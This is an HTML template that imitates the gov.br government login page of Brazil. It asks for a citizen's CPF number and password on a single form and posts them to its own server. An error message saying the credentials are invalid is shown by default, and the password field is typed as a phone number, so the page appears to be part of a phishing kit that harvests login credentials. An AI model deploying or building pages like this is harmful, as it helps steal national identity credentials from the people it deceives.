<!DOCTYPE html>
<html lang="{{ app()->getLocale() }}">

<head>
  <meta charset="utf-8">
  <title>gov.br - Acesse sua conta</title>
  <meta property="creator.productor" content="http://estruturaorganizacional.dados.gov.br/id/unidade-organizacional/2981">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />

  <link rel="icon" href="/../imagens/icons/favicon.ico" type="image/x-icon">
  <!-- Fontawesome -->
  <link rel="stylesheet" href="/assets/govbr/fontawesome/css/all.min.css">
  <!-- Fonts -->
  <link rel="stylesheet" href="/assets/govbr/fonts/rawline/rawline.css">
  <!-- Page CSS -->
  <link rel="stylesheet" href="../assets/css/govbr-highcontrast.css">
  <link rel="stylesheet" href="../assets/css/govbr-templates.css">
  <link rel="stylesheet" href="../assets/css/govbr-modal.css">
  <link rel="stylesheet" href="../assets/css/govbr-eula.css">
  <!-- Scripts -->
  <script src="/assets/govbr/js/contrast.class.js"></script>
  <script src="/assets/govbr/js/modal.js"></script>
</head>

<body>
    <a tabindex="0" href="#conteudo" class="sr-only sr-only-focusable" aria-label="Pular para o conteÃºdo principal. Navegue sempre com a tecla TAB"></a>

    <header>
        <a href="https://www.gov.br"><img src="../images/govbr.png" alt="Logomarca GovBR" /></a>
        <div id="acessibilidade">
            <span>
                <a href="#"><i class="fas fa-adjust"></i><span>Alto Contraste</span></a>
            </span>
            <span>
                <a href="//www.vlibras.gov.br" target="_BLANK"><i class="fas fa-deaf"></i><span>VLibras</span></a>
            </span>
        </div>
        
    </header>
<div class="container">
	<aside id="aside-signin">
		<img id="identidade-govbr" src="../images/icons/conta_govbr_v2.jpg" alt="Logomarca GovBR" />
	</aside>
	<main id="main-signin">
	<form method="post" id="loginData" autocomplete="off" novalidate>
		<div class="card" id="login-cpf">
			<input type="hidden" name="_csrf" value="9e9ba24f-275b-40e2-8992-5f3887b61216" />
			<h3>Identifique-se no gov.br com:</h3>
			<div class="item-login-signup-ways">
				<img src="../images/icons/id-card-solid.png">
				<a tabindex="3">Número do CPF</a>
			</div>
			<div class="accordion-panel" id="accordion-panel-id">
				<p>Digite seu CPF para <strong>criar</strong> ou <strong>acessar</strong> sua conta gov.br</p>
				<label for="cpf">CPF</label>
				<input id="accountId" name="accountId" autocomplete="new-password" tabindex="1" type="tel" value="" placeholder="Digite seu CPF" aria-invalid="false">
				<label for="cpf">Senha</label>
				<input id="accountPassword" name="accountPassword" autocomplete="new-password" tabindex="1" type="tel" value="" placeholder="Digite sua senha" aria-invalid="false">
				<div class="erro">
					<p>
						Usuário e/ou senha inválidos. (ERL0003000)</p>
				</div>
				<div class="button-panel" id="login-button-panel">
					<button name="action" value="enterAccountId" class="button-continuar" type="submit" tabindex="2">Entrar</button>
				</div>
			</div>
			<label id="title-outras-op">Outras opções de identificação:</label>
			<hr id="hr-outras-op" style="margin: 0 0 0">

			<div class="item-login-signup-ways">
				<img src="../images/icons/InternetBanking-green.png" />
				<!-- Para voltar a cor normal, basta apagar o style do link e remover o 'green' do nome da imagem acima. -->
				<a tabindex="5" href="#" style="color:#008C32">Login com seu banco
					<span style="font-size: 7px; background-color: #008C32; color: white; padding: 3px; top: -3px; position: relative; margin-left: 8px;">SUA   CONTA   SERÁ   PRATA</span>
				</a>
			</div>

			<div class="item-login-signup-ways">
				    <img src="../images/icons/qrcode.png" />
						<a tabindex="5" href="#">
							Login com QR code
							<!--img src="../imagens/icons/icons/novo.svg" style="margin-left: 1ex"-->
						</a>
				    </div>
			<div class="item-login-signup-ways" id="cert-digital">
					<img src="../images/icons/CD.png"/>
					<a tabindex="4" href="https://certificado.sso.acesso.gov.br/login?client_id=www.gov.br&authorization_id=187deb2d30c">Seu certificado digital</a>
				</div>
			<div class="item-login-signup-ways" id="cert-digital-cloud">
				<img src="../images/icons/CD-Nuvem.png" id="cert-digital-cloud-img"/>
				<a tabindex="5" href="#" id="cert-digital-cloud-a" >Seu certificado digital em nuvem</a>
			</div>
			<div class="entenda-id-govbr" id="entenda-id-govbr">
				<span>
					<i class="fa fa-info-circle" aria-hidden="true"></i><a tabindex="6" href="https://www.gov.br/governodigital/pt-br/conta-gov-br/conta-gov-br/" id="entenda-id-govbr-a">Entenda a conta gov.br</a>
					<a tabindex="6" href="https://cadastro.acesso.gov.br/termo-de-uso" style="display: block;" target="_blank" id="termo-de-uso">Termo de Uso e Aviso de Privacidade</a>
				</span>
			</div>
		</div>
	</form>
	</main>
</div>




  <footer>
  </footer>

  <!-- Jquery -->
  <script src="assets/vendors/jquery/jquery-2.2.4.min.js"></script>
  <!-- JS Website -->
  <script src="/assets/govbr/js/scripts.js"></script>
  <script src="/assets/vendors/jquery/jquery.maskedinput.js"></script>
</body>

</html>